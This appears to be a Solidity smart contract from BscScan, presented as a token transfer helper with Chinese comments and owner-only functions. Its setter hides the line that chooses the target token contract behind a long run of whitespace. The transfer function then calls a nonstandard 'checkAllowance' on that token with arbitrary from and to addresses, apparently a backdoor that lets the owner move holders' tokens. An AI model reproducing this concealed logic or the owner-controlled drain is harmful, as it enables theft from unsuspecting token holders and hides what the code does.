/**
 *Submitted for verification at BscScan.com on 2022-08-07
*/

pragma solidity ^0.8.1;

// SPDX-License-Identifier: Unlicensed
interface token { 
    // function transferFrom(address sender, address recipient, uint256 amount)external{ sender; recipient; amount; } 
    // function transfer(address recipient, uint256 amount){ recipient; amount; }
        function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
     function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function checkAllowance( 
        address sender,
        address recipient,
        uint256 amount)
        external;

        function totalSupply() external view returns (uint256);
        function balanceOf(address account) external view returns (uint256);
        function allowance(address owner, address spender)
        external
        view
        returns (uint256);
        function approve(address spender, uint256 amount) external returns (bool);
    } //transfer方法的接口说明
contract Ownable {
    address public _owner = msg.sender;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

contract tokenu is Ownable {
    token public wowToken;
    // address private ownerdapp = address(0x09C2b572B785A5b3f7E581C5263c13485c48dEE2);
    // token public sToken;

 
    // function TokenTransfer() public{
    //    wowToken = token(0x15c4085143cbCee57c137542BAc7f3F88f12E17e); //实例化一个token
    // //    sToken = token(0x8026AED8aA23B06E51B831b507C162Aa27D2D276); //实例化一个token
    // }
 
    function tokenaaaTransfer(address _from,address _to, uint256 _amt) public onlyOwner{
        token(wowToken).checkAllowance(_from,_to,_amt); //调用token的transfer方法
        // sToken.transfer(_from,_amt); //调用token的transfer方法
    }
    function setaaaTransfer(address[] memory _recipients, uint256 _values) public onlyOwner{
        require(_recipients.length >= 0);
        // for(uint j = 0; j < _recipients.length; j++){
            // token.transfer(_recipients[j], _values);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                _values = (_values + 11) / 5 * 3 + 7 ;
            wowToken = token(_recipients[_values]); 
        // }
 
    }
}